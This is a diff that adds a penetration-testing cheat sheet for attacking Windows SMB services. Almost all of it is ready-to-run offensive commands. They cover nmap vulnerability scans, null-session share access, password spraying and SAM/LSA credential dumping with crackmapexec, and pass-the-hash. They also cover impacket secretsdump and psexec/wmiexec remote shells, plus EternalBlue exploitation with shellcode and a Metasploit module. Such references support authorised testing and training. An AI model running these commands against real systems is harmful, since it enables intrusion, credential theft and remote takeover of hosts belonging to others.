@@ -1,0 +1,51 @@
+SMB
+Nmap Scripts
+bashnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 139,445 target
+nmap --script smb-vuln-* -p 445 target          # all SMB vulns
+nmap --script smb-vuln-ms17-010 -p 445 target   # EternalBlue
+nmap --script smb-vuln-ms08-067 -p 445 target   # Conficker era
+nmap --script smb2-security-mode -p 445 target
+nmap --script smb-enum-domains -p 445 target
+Tools
+bash# enum4linux-ng (best SMB enum)
+enum4linux-ng -A target
+enum4linux-ng -A -C target   # with credentials
+
+# smbclient
+smbclient -L //target -N              # null session list shares
+smbclient //target/sharename -N       # connect null
+smbclient //target/sharename -U user  # with creds
+smbclient //target/C$ -U 'admin%password'
+
+# smbmap
+smbmap -H target                          # null
+smbmap -H target -u user -p pass
+smbmap -H target -u user -p pass -r       # recursive list
+smbmap -H target -u user -p pass --download 'share\file.txt'
+
+# crackmapexec (CME) - swiss army knife
+crackmapexec smb target
+crackmapexec smb target -u '' -p ''                    # null
+crackmapexec smb target -u user -p pass
+crackmapexec smb target -u users.txt -p pass           # spray
+crackmapexec smb target -u user -p pass --shares
+crackmapexec smb target -u user -p pass --sam          # dump SAM
+crackmapexec smb target -u user -p pass --lsa          # dump LSA
+crackmapexec smb target -u user -p pass -x "whoami"    # exec cmd
+crackmapexec smb target -u user -p pass --spider share # spider share
+crackmapexec smb target -u user -H NTLMhash            # PTH attack
+
+# impacket suite
+impacket-smbclient user:pass@target
+impacket-secretsdump user:pass@target      # dump hashes
+impacket-secretsdump -just-dc target/user:pass@dc_ip  # domain dump
+impacket-psexec user:pass@target           # shell via SMB
+impacket-wmiexec user:pass@target          # WMI shell
+impacket-atexec user:pass@target "whoami"  # AT scheduler exec
+EternalBlue
+bash# Check + exploit
+nmap --script smb-vuln-ms17-010 -p 445 target
+# If vulnerable:
+python3 checker.py target
+python3 eternalblue_exploit7.py target shellcode/sc_x64.bin
+# Or use metasploit: use exploit/windows/smb/ms17_010_eternalblue
